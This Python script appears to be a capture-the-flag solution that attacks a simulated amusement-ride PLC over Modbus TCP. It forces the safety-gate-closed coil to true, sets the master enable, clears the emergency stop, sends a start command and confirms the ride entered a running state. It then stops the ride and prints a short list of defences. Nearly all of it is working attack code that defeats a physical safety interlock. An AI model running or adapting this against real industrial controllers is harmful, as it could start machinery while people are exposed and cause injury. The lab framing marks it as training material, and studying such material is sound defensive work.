#!/usr/bin/env python3
"""
Safety Bypass Attack
CTF Challenge: Start ride with safety gate open

This script demonstrates a critical safety vulnerability where
an attacker can bypass safety interlocks by directly manipulating
the safety_gate_closed signal.
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def main():
    print("[Safety Bypass Attack]")
    print("=" * 50)
    print("⚠️  WARNING: This demonstrates a critical safety vulnerability")
    print()

    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)

    if not client.connect():
        print(f"❌ Failed to connect to PLC at {PLC_HOST}:{PLC_PORT}")
        return

    print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")

    print("\n[Phase 1] Reading safety status...")
    result = client.read_coils(1, 4)
    if not result.isError():
        master_enable = result.bits[0]
        emergency_stop = result.bits[1]
        safety_gate = result.bits[3]

        print(f"  Master Enable: {master_enable}")
        print(f"  Emergency Stop: {emergency_stop}")
        print(f"  Safety Gate Closed: {safety_gate}")

        if not safety_gate:
            print("\n⚠️  Safety gate is OPEN - normal operation would prevent start")

    print("\n[Phase 2] Bypassing safety interlock...")
    print("  Step 1: Forcing safety_gate_closed signal to TRUE")
    client.write_coil(4, True)
    time.sleep(0.5)

    print("  Step 2: Ensuring other safety conditions are met")
    client.write_coil(1, True)  # master_enable = TRUE
    client.write_coil(2, False) # emergency_stop = FALSE
    time.sleep(0.5)

    print("\n[Phase 3] Sending start command...")
    client.write_coil(10, True)  # start_command = TRUE
    time.sleep(1)
    client.write_coil(10, False) # Release start button

    print("\n[Phase 4] Checking ride state...")
    result = client.read_holding_registers(6, 1)
    if not result.isError():
        state = result.registers[0]
        state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency', 'Maintenance']
        state_name = state_names[state] if state < len(state_names) else 'Unknown'

        print(f"  PLC State: {state} ({state_name})")

        if state >= 1:
            print("\n🎯 CTF FLAG: Safety Bypass successful!")
            print("   Ride started despite safety gate being physically open")
            print("   This represents a critical safety vulnerability")

    print("\n[Phase 5] Restoring safety (stopping ride)...")
    client.write_coil(11, True)  # stop_command = TRUE
    time.sleep(1)
    client.write_coil(11, False)

    print("✓ Attack demonstration complete")
    print("\n[Defensive Measures]")
    print("  1. Implement physical safety relays independent of PLC")
    print("  2. Use cryptographic signing for safety-critical signals")
    print("  3. Monitor for anomalous signal patterns")
    print("  4. Implement network segmentation")

    client.close()

if __name__ == '__main__':
    main()
